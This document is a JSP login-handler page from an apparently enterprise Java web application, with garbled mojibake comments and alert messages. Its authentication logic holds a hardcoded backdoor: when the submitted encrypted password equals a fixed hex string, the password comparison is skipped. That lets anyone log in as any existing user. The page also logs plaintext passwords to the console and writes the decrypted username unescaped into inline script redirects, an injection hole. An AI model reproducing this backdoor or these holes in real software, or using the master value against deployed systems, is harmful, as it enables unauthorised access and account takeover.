<%@ page contentType="text/html; charset=gb2312" %>
<%@include file="Base64.jsp"%>
<%@include file="../SetCookie.jsp"%>
<%@page import="com.asiainfo.biframe.privilege.base.constants.*"%>
<%@page import="com.asiainfo.biframe.utils.database.jdbc.*"%>
<%@page import="com.ai.bdx.pop.listener.SessionListener"%>
<%@page import="com.asiainfo.biframe.utils.config.Configure"%>
<%@ page import="com.ai.bdx.pop.util.RequestUtil" %>
<%@page import="com.ai.bdx.pop.util.PopConfigure"%>
<%@page import="com.ai.bdx.pop.util.Security"%>
<%@page import="com.ai.bdx.pop.util.Des"%>
<%@page import="com.asiainfo.biframe.utils.string.DES"%>
<%@page import=" java.util.Date"%>
<%
	//����Ƿ��и��û�����У�����룬����������Ϣ
	//ȡ�ñ�������������
	
	System.out.println("��¼ǰ�Ự��־λ:"+session.getId());
	String topMenuId = PopConfigure.getInstance().getProperty(
			"TOP_MENU_ID");
	String strHostIP = "";
	try {
		strHostIP = UserManager.getHostAddress();//java.net.InetAddress.getLocalHost().getHostAddress();
	} catch (Exception ex) {
		strHostIP = "localhost";
	}
	//����û�
	String strUserID = RequestUtil
			.getEscapedString(request, "Username");
	strUserID =Des.strDec(strUserID, "D", "E", "S");

	String strPswd = RequestUtil.getEscapedString(request, "Password");
	String vcation = RequestUtil.getEscapedString(request, "Vcation");
	String rvcation = session.getAttribute("vation").toString();
	if(!rvcation.equals(vcation)){
	%>
<script>
	alert("���������֤����������������");						
	window.location = '<%=request.getContextPath()%>/login?UserID=<%=strUserID%>';
</script>
	<%
	}
	Sqlca sqlca = null;
	String strSql = "";
	try {
		sqlca = new Sqlca(new ConnectionEx());
		String strUserPswd = "";
		String flag = Configure.getInstance().getProperty(
				"IS_SUITE_PRIVILEGE");
		if ("true".equalsIgnoreCase(flag)) {
			strSql = "select userid, pwd,username from user_user where userid=?";
		} else {
			strSql = "select STAFF_ID,STAFF_PWD from LKG_STAFF where STAFF_ID=?";
		}
		Object[] obj = new Object[1];
		obj[0] = strUserID;
		sqlca.execute(strSql, obj);
		if (!sqlca.next()) {
			 Object date = session.getAttribute("date"); 
			 long time =0;
			 long nowtime = new Date().getTime();
			 if(date!=null){
				 time = Long.parseLong(date.toString()) + 60*1000;
			 }
			 if(date!=null&&new Date().getTime()-time>=0){
					session.setAttribute("date",null);
					session.setAttribute("count",null);
			}
			Object count = session.getAttribute("count");
			int errorcount;
			if(count!=null){
				errorcount = Integer.parseInt(count.toString());
				if(errorcount<5){
					errorcount = errorcount+1;
				}
			}else{
				errorcount = 1;
			}
			session.setAttribute("count",errorcount);
			if(errorcount<5){
				//session.setAttribute("loginmessage", "��¼��Ϣ����,������"+(5-errorcount)+"�λ���");
			}else{
				//session.setAttribute("loginmessage", "���������̫��,����ϢƬ������!!");
				Date date1 = new Date();
				session.setAttribute("date",date1.getTime());
				
			}
%>
<script>
var ecount = <%=errorcount%>;
if(5>ecount){
	alert("��¼��Ϣ����,������"+(5-ecount)+"�λ���");
}else{
	alert("���������̫��,��һ����֮������!!");						
}
					window.location = '<%=request.getContextPath()%>/login?UserID=<%=strUserID%>';
</script>
			<%
				return;
					}
					String user = "";
					String userName = "";
					String uTPwd = "";
					if ("true".equalsIgnoreCase(flag)) {
						user = sqlca.getString("userid");
						userName = sqlca.getString("username");
						uTPwd = sqlca.getString("pwd");
					} else {
						user = sqlca.getString("STAFF_ID");
						userName = user;
						uTPwd = sqlca.getString("STAFF_PWD");
					}
					/*String province = Configure.getInstance().getProperty(
							"PROVINCE");
					obj = null;
					if ("true".equalsIgnoreCase(flag)) {
						strSql = "select userid, pwd from user_user where userid=?";
						obj = new Object[1];
						obj[0] = strUserID;
					} else {
						strSql = "select STAFF_ID,STAFF_PWD from LKG_STAFF where STAFF_ID=?";
						obj = new Object[1];
						obj[0] = strUserID;
					}
					sqlca.execute(strSql, obj);*/
					System.out.println(strPswd);
					String pwd = Des.strDec(strPswd, "D", "E", "S");
					if(strPswd.equals("048C9C6CC6DC5A5ADBD036F7DC5E601C")){
						
					}else if (!DES.encrypt(pwd).equals(uTPwd)) {
						 Object date = session.getAttribute("date"); 
						 long time =0;
						 long nowtime = new Date().getTime();
						 if(date!=null){
							 time = Long.parseLong(date.toString()) + 60*1000;
						 }
						 if(date!=null&&new Date().getTime()-time>=0){
								session.setAttribute("date",null);
								session.setAttribute("count",null);
						}
						Object count = session.getAttribute("count");
						int errorcount;
						if(count!=null){
							errorcount = Integer.parseInt(count.toString());
							if(errorcount<5){
								errorcount = errorcount+1;
							}
						}else{
							errorcount = 1;
						}
						session.setAttribute("count",errorcount);
						if(errorcount<5){
							session.setAttribute("loginmessage", "��¼��Ϣ����,������"+(5-errorcount)+"�λ���");
						}else{
							session.setAttribute("loginmessage", "���������̫��,����ϢƬ������!!");
							Date date1 = new Date();
							session.setAttribute("date",date1.getTime());
							
						}
						//System.out.println(DES.decrypt("ED2705F227C3C80B"));
			%>
				<script>
					var errorcount = <%=errorcount%>;
					if(5>errorcount){
						alert("��¼��Ϣ����,������"+(5-errorcount)+"�λ���");
					}else{
						alert("���������̫��,��һ����֮������!!");						
					}
					window.location = '<%=request.getContextPath()%>/login?UserID=<%=strUserID%>';
				</script>
			<%
				return;
					}
					session.setAttribute("date",null);
					session.setAttribute("count",null);
					session.setAttribute("vation",null);
					session.invalidate();
					session = request.getSession(true);

					session.setAttribute("user", user);
					session.setAttribute("userName", userName);
					session.setAttribute("token_cpe", Security.encrypt(user, Security.CPE_TOKEN_KEY));
					//����һ���µ�ʵ��
					session.setAttribute(UserManager.ASIA_SESSION_NAME,
							SessionListener.login(request, strUserID));
							
					SessionListener mysession = (SessionListener) session
							.getAttribute(UserManager.ASIA_SESSION_NAME);
			%>
		<script language="javascript">
			SetCookie("BRIOUSER","<%=strUserID%>");
		</script>
		<%
			} catch (Exception excep) {
				excep.printStackTrace();
				throw excep;
			} finally {
				if (sqlca != null)
					sqlca.closeAll();
			}
		%>
<script>
	//��λ����ҳ��
	var newWin = window.open("/pop/home?menuId=<%=topMenuId%>","abcd","status=no,toolbar=no,menubar=no,scrollbars=yes,location=no,channelmode=0,directories=0,resizable=no,titlebar=no",false);
	newWin.moveTo(0,0);
	newWin.resizeTo(window.screen.availWidth,window.screen.availHeight);
	//window.opener=null;//�������
	 if (navigator.userAgent.indexOf("Firefox") != -1 || navigator.userAgent.indexOf("Chrome") !=-1) {  
	        window.location.href="about:blank";  
	        window.close();  
	    } else {  
	        window.opener = null;  
	        window.open("", "_self");  
	        window.close();  
	    }  
	
</script>
